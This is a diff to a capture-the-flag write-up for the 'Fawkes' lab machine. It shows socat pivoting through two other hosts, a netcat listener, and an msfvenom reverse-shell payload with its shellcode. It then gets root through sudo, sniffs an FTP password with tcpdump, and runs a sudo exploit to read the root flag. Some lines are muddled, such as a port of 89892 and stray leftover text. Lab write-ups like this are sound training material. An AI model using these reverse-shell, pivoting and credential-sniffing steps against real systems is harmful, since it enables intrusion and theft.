@@ -2798,26 +2798,207 @@ so it works let's adapt it to explote fawkes
 
 a few changes 
 
+first of all the python code 
+
+now we will connect to the nearest node in our case is the second interface of nagini 198.168.100.29
+```bash
+^Croot@Nagini:/dev/shm# ./socat TCP-LISTEN:9090,fork TCP:10.10.0.136:89892
+
+```
+
+
+and we have to connect to a port that we wil be sharing on nagini using chisel so you better send it 
+```bash
+root@Aragog:/dev/shm# ./socat TCP-LISTEN:89892,fork TCP:192.168.100.53:4434
+
+```
+
+
+another change is that we have to stay forking the communication that comes from nagini to argog and send to our personal desktop
+
+```bash
+nc -nlvp 4434
+listening on [any] 4434 ...
+
+```
 we have to change the shell code and where we want to connect before we aim to our localHost
 
+```bash 
+❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.129 LPORT=9090 -b "\x00" -f py -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of py file: 550 bytes
+shellcode =  b""
+shellcode += b"\xda\xd1\xd9\x74\x24\xf4\x58\xba\x89\xc1\xe4"
+shellcode += b"\x0f\x2b\xc9\xb1\x12\x31\x50\x17\x83\xe8\xfc"
+shellcode += b"\x03\xd9\xd2\x06\xfa\xe8\x0f\x31\xe6\x59\xf3"
+shellcode += b"\xed\x83\x5f\x7a\xf0\xe4\x39\xb1\x73\x97\x9c"
+shellcode += b"\xf9\x4b\x55\x9e\xb3\xca\x9c\xf6\x83\x85\x3b"
+shellcode += b"\x87\x6c\xd4\xc3\xa4\xee\x51\x22\x1a\x88\x31"
+shellcode += b"\xf4\x09\xe6\xb1\x7f\x4c\xc5\x36\x2d\xe6\xb8"
+shellcode += b"\x19\xa1\x9e\x2c\x49\x6a\x3c\xc4\x1c\x97\x92"
+shellcode += b"\x45\x96\xb9\xa2\x61\x65\xb9"
+
+```
+
+execute it 
+
+```bash 
+connect to [192.168.100.53] from (UNKNOWN) [192.168.100.65] 52116
+ls
+core
+whoami
+harry
+
+```
+let's find where we are 
+
+```bash
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+
+```
+seems that we are in a docker 
+let's find a way to get root 
+
+```bash
+sudo -l
+User harry may run the following commands on 2b1599256ca6:
+    (ALL) NOPASSWD: ALL
+sudo /bin/bash
+sudo: /bin/bash: command not found
+whoami
+harry
+sudo /bin/sh
+whoami
+root
 
 
 
+seems that they need a favor 
+```bash
 
+Hello Admin!!
 
+We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
+```
+
+we can try it using tcpdum 
 before you run your exploit.py make sure you specify where they have to go for that reason we import socket 
 
 ejm
 
 ```bash
-
-
-
+tcpdump -i eth0 port ftp or ftp-data
 ```
 
+look in the output we get a potential credentias 
+```bash
+00:42:01.922319 IP 2b1599256ca6.21 > 172.17.0.1.44362: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 2528919913 ecr 2232850702], length 20: FTP: 220 (vsFTPd 3.0.3)
+00:42:01.922369 IP 172.17.0.1.44362 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 2232850702 ecr 2528919913], length 0
+00:42:01.922454 IP 172.17.0.1.44362 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 2232850703 ecr 2528919913], length 14: FTP: USER neville
+00:42:01.922464 IP 2b1599256ca6.21 > 172.17.0.1.44362: Flags [.], ack 15, win 510, options [nop,nop,TS val 2528919914 ecr 2232850703], length 0
+00:42:01.922507 IP 2b1599256ca6.21 > 172.17.0.1.44362: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 2528919914 ecr 2232850703], length 34: FTP: 331 Please specify the password.
+00:42:01.922553 IP 172.17.0.1.44362 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 2232850703 ecr 2528919914], length 15: FTP: PASS bL!Bsg3k !
+```
+
+```bash
+ USER neville:PASS bL!Bsg3k
+```
+
+let's use them 
+```bash 
+root@Nagini:~# ssh neville@192.168.100.130
+neville@192.168.100.130's password: 
+Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+neville@Fawkes:~$ whoami
+neville
+neville@Fawkes:~$ 
+
+```
+```bash 
+neville@Fawkes:/$ find \-perm -4000  2>/dev/null
+./usr/local/bin/sudo
+./usr/bin/newgrp
+./usr/bin/chfn
+./usr/bin/mount
+./usr/bin/su
+./usr/bin/passwd
+./usr/bin/chsh
+./usr/bin/gpasswd
+./usr/bin/umount
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/eject/dmcrypt-get-device
+neville@Fawkes:/$ sudo --version
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27
+neville@Fawkes:/$ which nano
+/usr/bin/nano
+neville@Fawkes:/$ nano /tmp/exploit.py
+neville@Fawkes:/$ cd tmp/
+neville@Fawkes:/tmp$ ls
+exploit.py  systemd-private-d9dde3b845f44ed99447c8ecd1c7a882-apache2.service-bEKseA  systemd-private-d9dde3b845f44ed99447c8ecd1c7a882-systemd-timesyncd.service-DG47M5
+neville@Fawkes:/tmp$ python3 exploit.py 
+# whoami
+root
+# cd /root/     
+# ls
+horcrux3.txt
+# cat horcrux3.txt
+__     __    _     _                           _     _     
+\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ 
+ \ \ / / _ \| |/ _` |/ _ \ '_ ` _ \ / _ \| '__| __| | / __|
+  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \
+   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/
+                                                           
+     _       __            _           _ 
+  __| | ___ / _| ___  __ _| |_ ___  __| |
+ / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |
+| (_| |  __/  _|  __/ (_| | ||  __/ (_| |
+ \__,_|\___|_|  \___|\__,_|\__\___|\__,_|
+                                         
+
+
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Hard
+Machine Name: Fawkes
+Horcruxes Hidden in this VM: 3 horcruxes
+
+You have successfully pwned Fawkes machine & defeated Voldemort.
+Here is your last hocrux: horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}
 
 
 
 
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+
+# 
+
+```bash
+# hostname -I
+192.168.100.130 172.17.0.1 
+# 
+```
 
 Happy hacking !
